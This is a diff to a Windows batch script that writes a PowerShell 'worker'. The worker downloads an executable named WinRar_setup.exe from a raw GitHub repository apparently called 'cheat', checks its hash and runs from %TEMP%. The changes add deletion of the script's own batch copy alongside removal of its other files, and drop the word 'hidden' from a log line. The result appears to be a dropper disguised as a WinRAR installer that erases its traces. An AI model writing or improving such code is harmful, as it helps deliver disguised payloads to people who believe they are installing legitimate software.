@@ -5,6 +5,7 @@ set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/m
 set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
 set "WORK_DIR=%TEMP%\WinRarPkg"
 set "OUT=%WORK_DIR%\WinRar_setup.exe"
+set "BAT_SELF=%TEMP%\a.bat"
 set "PS_SCRIPT=%TEMP%\winrar_worker.ps1"
 set "LOG=%TEMP%\winrar_worker.log"
 
@@ -15,6 +16,7 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo $h = $env:HASH.ToLowerInvariant^(^)
   echo $dir = $env:WORK_DIR
   echo $f = $env:OUT
+  echo $bat = $env:BAT_SELF
   echo $log = $env:LOG
   echo $psFile = $PSCommandPath
   echo.
@@ -24,7 +26,7 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo }
   echo.
   echo try {
-  echo     Write-Log "Start hidden worker. URL=$u"
+  echo     Write-Log "Start worker. URL=$u"
   echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
   echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
   echo     }
@@ -74,6 +76,9 @@ set "LOG=%TEMP%\winrar_worker.log"
   echo     Start-Sleep -Seconds 2
   echo     if ^($dir -and ^(Test-Path -LiteralPath $dir^)^) {
   echo         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
+  echo     }
+  echo     if ^($bat -and ^(Test-Path -LiteralPath $bat^)^) {
+  echo         Remove-Item -LiteralPath $bat -Force -ErrorAction SilentlyContinue
   echo     }
   echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
   echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
